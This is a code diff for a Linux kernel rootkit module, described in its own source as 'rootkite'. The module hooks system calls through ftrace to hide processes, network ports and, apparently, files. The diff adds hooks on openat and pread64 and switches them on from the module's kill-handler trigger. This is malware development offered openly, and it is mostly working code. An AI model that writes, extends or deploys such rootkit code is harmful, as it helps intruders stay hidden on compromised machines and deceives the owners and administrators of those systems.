@@ -13,7 +13,7 @@
 #include "getdents_hacks.h"
 #include "hide_process.h"
 #include "hide_ports.h"
-
+#include "files_hacks.h"
 
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("rootkite");
@@ -38,6 +38,8 @@ static struct ftrace_hook ACTIVE_HOOKS[] = {
     HOOK("__x64_sys_getdents", hack_getdents, &orig_getdents),
     HOOK("__x64_sys_kill", hack_kill, &orig_kill),
     HOOK("__x64_sys_reboot", hack_reboot, &orig_reboot),
+    HOOK("__x64_sys_openat", hack_openat, &orig_openat),
+    HOOK("__x64_sys_pread64", hack_pread64, &orig_pread64),
     HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
     HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
@@ -50,6 +52,8 @@ static struct ftrace_hook ACTIVE_HOOKS[] = {
     HOOK("sys_getdents", hack_getdents, &orig_getdents),
     HOOK("sys_kill", hack_kill, &orig_kill),
     HOOK("sys_reboot", hack_reboot, &orig_reboot),
+    HOOK("sys_openat", hack_openat, &orig_openat),
+    HOOK("sys_pread64", hack_pread64, &orig_pread64),
     HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
     HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
@@ -82,6 +86,12 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         }
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_openat") == 1){
+            printk(KERN_ERR "error hooking syscall openat\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_pread64") == 1){
+            printk(KERN_ERR "error hooking syscall openat\n");
         }
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp4_seq_show") == 1){
             printk(KERN_ERR "error hooking tcp4_seq_show\n");
@@ -129,7 +139,12 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
         }
-
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_openat") == 1){
+            printk(KERN_ERR "error hooking syscall openat\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_pread64") == 1){
+            printk(KERN_ERR "error hooking syscall openat\n");
+        }
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp4_seq_show") == 1){
             printk(KERN_ERR "error hooking tcp4_seq_show\n");
         }
